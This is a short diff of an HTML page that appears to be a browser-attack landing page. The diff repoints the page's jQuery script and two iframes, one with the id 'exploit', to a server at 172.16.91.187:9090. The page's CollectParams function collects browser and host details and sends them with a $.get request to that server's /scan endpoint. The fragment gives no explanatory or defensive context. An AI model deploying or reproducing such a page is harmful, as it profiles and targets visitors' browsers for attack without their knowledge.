@@ -1,8 +1,9 @@
 <!DOCTYPE html> <html> <head> <script 
-src="http://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script> 
-</head> <body> <iframe id="exploit" src="http://www.google.com" 
+src="http://172.16.91.187:9090/jquery.min.js"></script>
+</head> <body> 
+<iframe id="exploit" src="http://172.16.91.187:9090/blank.html" 
 width="100" height="100"></iframe> 
-<iframe id="signed" src="http://www.google.com" 
+<iframe id="signed" src="http://172.16.91.187:9090/blank.html" 
 width="100" height="100"></iframe> 
 <script> var BrowserScanHostDetails = 
 {};
@@ -2666,6 +2667,7 @@ function CollectParams(){
 	$(document).ready(function(){
 	//$(document).ready(function(){
 	  $.get('http://172.16.91.187:9090/scan?' + params, function(data) {
+	  //plugins111
 	  });
 	});
 	return params;
